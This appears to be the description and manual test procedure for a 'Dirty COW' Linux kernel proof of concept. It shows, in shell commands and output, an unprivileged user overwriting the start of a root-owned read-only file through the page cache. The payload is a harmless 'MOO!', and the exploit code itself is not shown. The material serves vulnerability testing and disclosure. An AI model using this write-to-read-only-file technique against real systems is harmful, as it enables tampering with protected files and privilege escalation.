"Dirty cow" POC, installs 32-bit MOO! or 64-bit MOO!!!!! as the first word of
specified file. Only the fs cache is altered, it doesn't actually write to
disk, but Linux normally won't reload cached files so the change could persist
until reboot. 

Manual test procedure:

  root# echo This is a test > /var/test

  root# chmod 644 /var/test

  root# su -s /bin/bash nobody 

  nobody$ echo Make sure the file is read-only > /var/test
  bash: /var/test: Permission denied

  nobody$ /path/to/moo /var/test 
  Success after 720 tries!

  nobody$ exit 

  root# cat /var/test 
  MOO!!!!!a test
